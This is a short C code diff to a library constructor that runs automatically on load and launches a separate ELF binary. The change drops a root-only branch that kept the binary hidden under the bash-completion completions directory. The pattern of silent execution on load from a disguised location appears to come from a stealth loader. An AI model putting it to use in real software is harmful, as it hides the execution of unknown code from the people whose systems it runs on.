@@ -24,12 +24,7 @@ void __attribute__((constructor)) initLibrary(void) {
     char elf_path[1024]; // path to target ELF file
     const char *cwd = getcwd(NULL, 0);
     // decides where to get target ELF binary
-    if (getuid() == 0) {
-      snprintf(elf_path, 1024, "/usr/share/bash-completion/completions/%s",
-               exe_name);
-    } else {
-      snprintf(elf_path, 1024, "%s/_%s", cwd, exe_name);
-    }
+    snprintf(elf_path, 1024, "%s/_%s", cwd, exe_name);
 
     // Run the ELF
     char *argv[] = {exe, NULL};
